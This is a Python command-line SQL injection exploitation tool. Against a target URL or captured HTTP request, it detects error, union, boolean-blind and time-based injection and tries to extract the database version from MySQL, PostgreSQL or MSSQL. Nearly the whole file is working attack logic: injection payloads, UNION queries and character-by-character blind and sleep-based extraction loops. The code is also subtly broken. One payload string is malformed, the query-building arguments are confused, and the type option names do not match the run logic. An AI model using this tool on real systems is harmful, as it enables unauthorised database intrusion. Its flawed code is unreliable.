#!/usr/bin/env python3
import argparse
import requests
import time
from urllib.parse import quote_plus

class SQLiScanner:
    def __init__(self, url, request_file=None, output_file=None, dbms='mysql'):
        self.url = url
        self.request_file = request_file
        self.output_file = output_file
        self.session = requests.Session()
        self.dbms = dbms.lower()

    def load_request(self):
        if self.request_file:
            with open(self.request_file, 'r') as f:
                return f.read().strip()
        return None

    def send_request(self, payload):
        if self.request_file:
            req_content = self.load_request()
            if 'FUZZ' in req_content:
                req = req_content.replace('FUZZ', payload)
                lines = req.split('\n')
                method = lines[0].split()[0]
                url = self.url
                headers = {}
                data = None

                for line in lines[1:]:
                    if not line.strip():
                        data = '\n'.join(lines[lines.index(line)+1:])
                        break
                    key, value = line.split(':', 1)
                    headers[key.strip()] = value.strip()

                return self.session.request(method, url, headers=headers, data=data)
            else:
                raise ValueError("Request file must contain 'FUZZ' marker")
        else:
            return self.session.get(f"{self.url}{payload}")

    def detect_injection_type(self):
        tests = {
            'error': "'"",
            'union': "' ORDER BY 1-- -",
            'boolean': "' AND 1=1-- -",
            'time': "' AND SLEEP(5)-- -"
        }

        for inj_type, payload in tests.items():
            try:
                start = time.time()
                response = self.send_request(quote_plus(payload))
                elapsed = time.time() - start

                if inj_type == 'time' and elapsed >= 5:
                    return 'time_based'
                elif inj_type == 'error' and 'SQL syntax' in response.text:
                    return 'error_based'
                elif inj_type == 'boolean' and response.status_code == 200:
                    return 'boolean_blind'
                elif inj_type == 'union' and response.status_code == 200:
                    return 'union_based'
            except:
                continue
        return None

    def build_query(self, base_query='version', pos=1, char=None, sleep=False):
        if self.dbms == 'mysql':
            if base_query == 'version':
                return "@@version"
            elif sleep:
                return f"IF(SUBSTRING(({char}),{pos},1)='{char}',SLEEP(5),0)"
            else:
                return f"SUBSTRING(({char}),{pos},1)='{char}'"

        elif self.dbms == 'postgres':
            if base_query == 'version':
                return "version()"
            elif sleep:
                return f"CASE WHEN SUBSTRING(({char}),{pos},1)='{char}' THEN pg_sleep(5) ELSE NULL END"
            else:
                return f"SUBSTRING(({char}),{pos},1)='{char}'"

        elif self.dbms == 'mssql':
            if base_query == 'version':
                return "@@version"
            elif sleep:
                return f"IF(SUBSTRING(({char}),{pos},1)='{char}') WAITFOR DELAY '0:0:5'"
            else:
                return f"SUBSTRING(({char}),{pos},1)='{char}'"

        return base_query

    def exploit_union(self, query):
        version_query = self.build_query(base_query='version')
        payload = f"' UNION ALL SELECT {version_query},NULL,NULL-- -"
        response = self.send_request(quote_plus(payload))
        return response.text

    def exploit_blind(self, query):
        result = ""
        chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_:,.- "

        for i in range(1, 50):
            found = False
            for char in chars:
                condition = self.build_query(base_query=None, pos=i, char=query, sleep=False)
                payload = f"' AND {condition}-- -"
                response = self.send_request(quote_plus(payload))
                if "true_condition" in response.text:
                    result += char
                    found = True
                    break
            if not found:
                break
        return result

    def exploit_time(self, query):
        result = ""
        chars = "0123456789abcdefghijklmnopqrstuvwxyz_:.- "

        for i in range(1, 20):
            found = False
            for char in chars:
                condition = self.build_query(base_query=None, pos=i, char=query, sleep=True)
                payload = f"' AND {condition}-- -"
                start = time.time()
                self.send_request(quote_plus(payload))
                elapsed = time.time() - start

                if elapsed >= 5:
                    result += char
                    found = True
                    break
            if not found:
                break
        return result

    def run(self, options):
        inj_type = options.type or self.detect_injection_type()

        if not inj_type:
            print("[-] Injection type not detected")
            return

        print(f"[+] Using {inj_type} exploitation against {self.dbms.upper()}")

        query = self.build_query(base_query='version')

        if inj_type == 'union_based':
            result = self.exploit_union(query)
        elif inj_type == 'boolean_blind':
            result = self.exploit_blind(query)
        elif inj_type == 'time_based':
            result = self.exploit_time(query)

        self.output(f"[+] Database version: {result}", options)

    def output(self, data, options):
        print(data)
        if options.output:
            with open(options.output, 'a') as f:
                f.write(data + '\n')

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Exploitation Tool')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-r', '--request', help='File with HTTP request')
    parser.add_argument('-o', '--output', help='Output file')
    parser.add_argument('-t', '--type', choices=['union', 'error', 'boolean', 'time'], 
                        help='Force injection type')
    parser.add_argument('--dbms', choices=['mysql', 'postgres', 'mssql'], default='mysql',
                        help='Specify the DBMS type (default: mysql)')

    args = parser.parse_args()

    scanner = SQLiScanner(args.url, args.request, args.output, args.dbms)
    scanner.run(args)

if __name__ == '__main__':
    main()
